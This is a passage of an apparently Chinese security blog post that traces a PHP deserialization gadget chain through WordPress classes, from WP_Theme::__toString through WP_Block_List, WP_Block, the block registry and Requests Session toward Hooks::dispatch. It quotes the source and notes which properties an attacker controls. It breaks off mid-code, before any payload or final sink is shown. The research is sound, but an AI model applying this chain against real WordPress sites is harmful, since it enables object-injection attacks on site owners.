invoke__">urldecode</span>(<span class="variable">$str</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>输出结果</strong>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240206221343.png"></p>
+<h1 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Hooks.php:<span class="number">93</span>, WpOrg\Requests\Hooks-&gt;<span class="title function_ invoke__">dispatch</span>()</span><br><span class="line">Hooks.php:<span class="number">93</span>, WpOrg\Requests\Hooks-&gt;<span class="title function_ invoke__">dispatch</span>()</span><br><span class="line">Requests.php:<span class="number">455</span>, <span class="title class_">WpOrg\Requests\Requests</span>::<span class="title function_ invoke__">request</span>()</span><br><span class="line">Session.php:<span class="number">232</span>, WpOrg\Requests\Session-&gt;<span class="title function_ invoke__">request</span>()</span><br><span class="line">Session.php:<span class="number">159</span>, WpOrg\Requests\Session-&gt;<span class="title function_ invoke__">get</span>()</span><br><span class="line"><span class="class"><span class="keyword">class</span>-<span class="title">wp</span>-<span class="title">theme</span>.<span class="title">php</span>:702, <span class="title">WP_Theme</span>-&gt;<span class="title">offsetGet</span>()</span></span><br><span class="line"><span class="class"><span class="title">class</span>-<span class="title">wp</span>-<span class="title">block</span>-<span class="title">type</span>-<span class="title">registry</span>.<span class="title">php</span>:145, <span class="title">WP_Block_Type_Registry</span>-&gt;<span class="title">get_registered</span>()</span></span><br><span class="line"><span class="class"><span class="title">class</span>-<span class="title">wp</span>-<span class="title">block</span>.<span class="title">php</span>:130, <span class="title">WP_Block</span>-&gt;<span class="title">__construct</span>()</span></span><br><span class="line"><span class="class"><span class="title">class</span>-<span class="title">wp</span>-<span class="title">block</span>-<span class="title">list</span>.<span class="title">php</span>:96, <span class="title">WP_Block_List</span>-&gt;<span class="title">offsetGet</span>()</span></span><br><span class="line"><span class="class"><span class="title">class</span>-<span class="title">wp</span>-<span class="title">theme</span>.<span class="title">php</span>:833, <span class="title">WP_Theme</span>-&gt;<span class="title">get</span>()</span></span><br><span class="line"><span class="class"><span class="title">class</span>-<span class="title">wp</span>-<span class="title">theme</span>.<span class="title">php</span>:851, <span class="title">WP_Theme</span>-&gt;<span class="title">display</span>()</span></span><br><span class="line"><span class="class"><span class="title">class</span>-<span class="title">wp</span>-<span class="title">theme</span>.<span class="title">php</span>:513, <span class="title">WP_Theme</span>-&gt;<span class="title">__toString</span>()</span></span><br><span class="line"><span class="class"><span class="title">debug</span>.<span class="title">php</span>:6, </span>&#123;main&#125;()</span><br></pre></td></tr></table></figure>
+
+<h1 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h1><p><strong>第一步</strong>：</p>
+<p>从测试文件开始</p>
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240206222129.png"></p>
+<p>通过反序列化得到的$obj是WP_Theme对象，而使用echo输出对象会触发该对象的__toString方法</p>
+<p><strong>第二步</strong>：</p>
+<p>进入wp-includes&#x2F;class-wp-theme.php的__toString方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * When converting the object to a string, the theme name is returned.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 3.4.0</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> string Theme name, ready for display (translated)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="string">&#x27;Name&#x27;</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入字符串Name，进入该对象的display方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"> <span class="variable">$header</span>, <span class="variable">$markup</span> = <span class="literal">true</span>, <span class="variable">$translate</span> = <span class="literal">true</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 这里</span></span><br><span class="line">    <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>( <span class="variable">$header</span> );</span><br><span class="line">    <span class="keyword">if</span> ( <span class="literal">false</span> === <span class="variable">$value</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$translate</span> &amp;&amp; ( <span class="keyword">empty</span>( <span class="variable">$value</span> ) || ! <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">load_textdomain</span>() ) ) &#123;</span><br><span class="line">        <span class="variable">$translate</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$translate</span> ) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">translate_header</span>( <span class="variable">$header</span>, <span class="variable">$value</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$markup</span> ) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">markup_header</span>( <span class="variable">$header</span>, <span class="variable">$value</span>, <span class="variable">$translate</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的$header为字符串Name，依旧还在该类中，进入get方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"> <span class="variable">$header</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( ! <span class="keyword">isset</span>( <span class="variable language_">$this</span>-&gt;headers[ <span class="variable">$header</span> ] ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! <span class="keyword">isset</span>( <span class="variable language_">$this</span>-&gt;headers_sanitized ) ) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headers_sanitized = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cache_get</span>( <span class="string">&#x27;headers&#x27;</span> );</span><br><span class="line">        <span class="keyword">if</span> ( ! <span class="title function_ invoke__">is_array</span>( <span class="variable">$this</span>-&gt;headers_sanitized ) ) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;headers_sanitized = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">isset</span>( <span class="variable language_">$this</span>-&gt;headers_sanitized[ <span class="variable">$header</span> ] ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;headers_sanitized[ <span class="variable">$header</span> ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If themes are a persistent group, sanitize everything and cache it. One cache add is better than many cache sets.</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">self</span>::<span class="variable">$persistently_cache</span> ) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$this</span>-&gt;headers ) <span class="keyword">as</span> <span class="variable">$_header</span> ) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;headers_sanitized[ <span class="variable">$_header</span> ] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitize_header</span>( <span class="variable">$_header</span>, <span class="variable">$this</span>-&gt;headers[ <span class="variable">$_header</span> ] );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cache_add</span>( <span class="string">&#x27;headers&#x27;</span>, <span class="variable">$this</span>-&gt;headers_sanitized );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 关键点</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headers_sanitized[ <span class="variable">$header</span> ] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitize_header</span>( <span class="variable">$header</span>, <span class="variable">$this</span>-&gt;headers[ <span class="variable">$header</span> ] );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;headers_sanitized[ <span class="variable">$header</span> ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的$this-&gt;headers[ $header ]类似于访问数组元素，而headers属性可以控制，将其设置成实现ArrayAccess接口的类，这样就会调用该类的 offsetGet、offsetSet、offsetExists 和 offsetUnset 等方法进行元素的操作</p>
+<p>这里将$this-&gt;headers设置成WP_Block_List对象，这个类实现了ArrayAccess接口，这样在$this-&gt;headers[ $header ]操作时会进入offsetGet方法，其中$header依旧为字符串Name</p>
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207000354.png"></p>
+<p><strong>第三步</strong>：</p>
+<p>进入wp-includes&#x2F;class-wp-block-list.php的offsetGet方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"> <span class="variable">$index</span> </span>) </span>&#123;</span><br><span class="line">    <span class="variable">$block</span> = <span class="variable language_">$this</span>-&gt;blocks[ <span class="variable">$index</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">isset</span>( <span class="variable">$block</span> ) &amp;&amp; <span class="title function_ invoke__">is_array</span>( <span class="variable">$block</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// 关键点</span></span><br><span class="line">        <span class="variable">$block</span>                  = <span class="keyword">new</span> <span class="title class_">WP_Block</span>( <span class="variable">$block</span>, <span class="variable language_">$this</span>-&gt;available_context, <span class="variable language_">$this</span>-&gt;registry );</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blocks[ <span class="variable">$index</span> ] = <span class="variable">$block</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$block</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样WP_Block_List对象中的属性全部都能控制，要达到关键点，需要满足if条件，即blocks属性要有Name键，并且是一个数组</p>
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207001449.png"></p>
+<p>这里会实例化一个WP_Block对象，并且参数都是可控</p>
+<p><strong>第四步</strong>：</p>
+<p>进入wp-includes&#x2F;class-wp-block.php的构造方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"> <span class="variable">$block</span>, <span class="variable">$available_context</span> = <span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$registry</span> = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;parsed_block = <span class="variable">$block</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;name         = <span class="variable">$block</span>[<span class="string">&#x27;blockName&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">is_null</span>( <span class="variable">$registry</span> ) ) &#123;</span><br><span class="line">        <span class="variable">$registry</span> = <span class="title class_">WP_Block_Type_Registry</span>::<span class="title function_ invoke__">get_instance</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;registry = <span class="variable">$registry</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关键点</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;block_type = <span class="variable">$registry</span>-&gt;<span class="title function_ invoke__">get_registered</span>( <span class="variable">$this</span>-&gt;name );</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;available_context = <span class="variable">$available_context</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里构造方法的$registry参数可控，并且关键点中的$this-&gt;name也可控，因此这里选择将$registry设置成WP_Block_Type_Registry 扩展类的实例，通过调用其get_registered方法来衔接链</p>
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207002356.png"></p>
+<p><strong>第五步</strong>：</p>
+<p>进入wp-includes&#x2F;class-wp-block-type-registry.php的get_registered方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_registered</span>(<span class="params"> <span class="variable">$name</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( ! <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">is_registered</span>( <span class="variable">$name</span> ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 关键点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;registered_block_types[ <span class="variable">$name</span> ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要到达关键点，首先需要不满足if条件：! $this-&gt;is_registered( $name )，即对应的$name已注册</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> function <span class="title function_">is_registered</span><span class="params">( $name )</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> isset( $<span class="built_in">this</span>-&gt;registered_block_types[ $name ] );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在关键点处，同样的道理，$this-&gt;registered_block_types为实现ArrayAccess接口的类实例，这样在取$name时能够调用offsetGet方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207003829.png"></p>
+<p>这里将$this-&gt;registered_block_types设置为WP_Theme实例，WP_Theme类同样也继承ArrayAccess接口</p>
+<p><strong>第六步</strong>：</p>
+<p>进入wp-includes&#x2F;class-wp-theme.php的offsetGet方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"> <span class="variable">$offset</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> ( <span class="variable">$offset</span> ) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Name&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Title&#x27;</span>:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">				 * See note above about using translated data. get() is not ideal.</span></span><br><span class="line"><span class="comment">				 * It is only for backward compatibility. Use display().</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>( <span class="string">&#x27;Name&#x27;</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Author&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="string">&#x27;Author&#x27;</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Author Name&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="string">&#x27;Author&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Author URI&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="string">&#x27;AuthorURI&#x27;</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Description&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="string">&#x27;Description&#x27;</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Version&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Status&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>( <span class="variable">$offset</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Template&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_template</span>();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Stylesheet&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_stylesheet</span>();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Template Files&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_files</span>( <span class="string">&#x27;php&#x27;</span>, <span class="number">1</span>, <span class="literal">true</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Stylesheet Files&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_files</span>( <span class="string">&#x27;css&#x27;</span>, <span class="number">0</span>, <span class="literal">false</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Template Dir&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_template_directory</span>();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Stylesheet Dir&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_stylesheet_directory</span>();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Screenshot&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_screenshot</span>( <span class="string">&#x27;relative&#x27;</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Tags&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>( <span class="string">&#x27;Tags&#x27;</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Theme Root&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_theme_root</span>();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Theme Root URI&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_theme_root_uri</span>();</span><br><span class="line">        <span class="comment">// 关键点</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Parent Theme&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>() ? <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>()-&gt;<span class="title function_ invoke__">get</span>( <span class="string">&#x27;Name&#x27;</span> ) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$offset参数可控，这里将其设置为’Parent Theme’，查看$this-&gt;parent()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">isset</span>( <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> ) ? <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回parent属性，$this-&gt;parent同样可控，可以将其设置为一个包含get方法的类实例，这里选择Session实例</p>
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207114947.png"></p>
+<p><strong>第七步</strong>：</p>
+<p>进入wp-includes&#x2F;Requests&#x2F;src&#x2F;Session.php的get方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$headers</span> = [], <span class="variable">$options</span> = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="variable">$url</span>, <span class="variable">$headers</span>, <span class="literal">null</span>, <span class="title class_">Requests</span>::<span class="variable constant_">GET</span>, <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的$url依旧是字符串Name，进入本类的request方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$headers</span> = [], <span class="variable">$data</span> = [], <span class="variable">$type</span> = <span class="title class_">Requests</span>::<span class="variable constant_">GET</span>, <span class="variable">$options</span> = []</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 合并成一个request请求</span></span><br><span class="line">    <span class="variable">$request</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">merge_request</span>(<span class="title function_ invoke__">compact</span>(<span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;headers&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;options&#x27;</span>));</span><br><span class="line">	<span class="comment">// 使用静态方法发起一个请求</span></span><br><span class="line">    <span class="comment">// 关键点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Requests</span>::<span class="title function_ invoke__">request</span>(<span class="variable">$request</span>[<span class="string">&#x27;url&#x27;</span>], <span class="variable">$request</span>[<span class="string">&#x27;headers&#x27;</span>], <span class="variable">$request</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$type</span>, <span class="variable">$request</span>[<span class="string">&#x27;options&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入request方法的参数都可控</p>
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207122634.png"></p>
+<p><strong>第八步</strong>：</p>
+<p>进入wp-includes&#x2F;Requests&#x2F;src&#x2F;Requests.php的request方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$headers</span> = [], <span class="variable">$data</span> = [], <span class="variable">$type</span> = <span class="built_in">self</span>::<span class="variable constant_">GET</span>, <span class="variable">$options</span> = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">InputValidator</span>::<span class="title function_ invoke__">is_string_or_stringable</span>(<span class="variable">$url</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">InvalidArgument</span>::<span class="title function_ invoke__">create</span>(<span class="number">1</span>, <span class="string">&#x27;$url&#x27;</span>, <span class="string">&#x27;string|Stringable&#x27;</span>, <span class="title function_ invoke__">gettype</span>(<span class="variable">$url</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$type</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">InvalidArgument</span>::<span class="title function_ invoke__">create</span>(<span class="number">4</span>, <span class="string">&#x27;$type&#x27;</span>, 